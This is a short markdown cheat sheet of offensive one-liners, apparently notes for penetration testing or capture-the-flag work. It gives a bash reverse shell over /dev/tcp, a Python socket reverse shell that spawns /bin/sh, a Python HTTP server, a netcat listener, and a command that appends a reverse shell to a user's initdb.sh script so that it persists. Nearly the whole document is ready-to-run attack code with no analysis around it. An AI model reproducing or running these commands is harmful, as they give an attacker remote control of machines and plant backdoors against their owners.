# shells and reverse listners

bash reverse shell
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
python reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
python server
```
python3 -m http.server 80
```
netcat listner
```
nc -lvnp 6666
```
create new shell
```
echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.xxx.xxx/9000 0>&1"' >> /home/dvir/initdb.sh
```
